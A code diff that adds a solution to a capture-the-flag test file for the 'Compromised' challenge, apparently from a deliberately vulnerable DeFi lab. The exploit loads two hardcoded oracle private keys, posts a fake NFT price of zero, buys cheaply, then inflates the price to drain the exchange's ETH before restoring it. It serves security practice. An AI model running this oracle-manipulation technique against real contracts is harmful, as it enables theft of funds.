@@ -1,5 +1,7 @@
 const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { BigNumber } = require('ethers');
+const { ethers, network} = require('hardhat');
+const web3 = require('web3');
 
 describe('Compromised challenge', function () {
 
@@ -9,12 +11,21 @@ describe('Compromised challenge', function () {
         '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
     ];
 
+    // const tx1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+    // const tx2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
     let deployer, attacker;
     const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
     const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        // const trace = await network.provider.send("debug_traceTransaction", [
+        //     tx1,
+        //   ]);
+        // console.log(trace);
+
+
         [deployer, attacker] = await ethers.getSigners();
 
         const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
@@ -61,6 +72,44 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const keys = [
+            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+        ];
+
+        var walletList = [];    
+        for (let i = 0; i < keys.length; i++) {
+            walletList.push(new ethers.Wallet(keys[i], ethers.provider));
+        }
+
+        // update NFT Pirce 0
+        var txList = [];
+        for (let i = 0; i < walletList.length; i++) {
+            txList.push(await this.oracle.connect(walletList[i]).postPrice("DVNFT", 0));
+        }
+        
+        // buy
+        await this.exchange.connect(attacker).buyOne(
+            {
+                value: ethers.utils.parseEther("0.001")
+            }
+        );
+
+        // exchnage pill
+        const sellAmt = await ethers.provider.getBalance(this.exchange.address);
+        
+        for (let i = 0; i < walletList.length; i++) {
+            await this.oracle.connect(walletList[i]).postPrice("DVNFT", sellAmt);
+        }
+
+        // approve exchange nft
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // update price nft
+        for (let i = 0; i < walletList.length; i++) {
+            await this.oracle.connect(walletList[i]).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
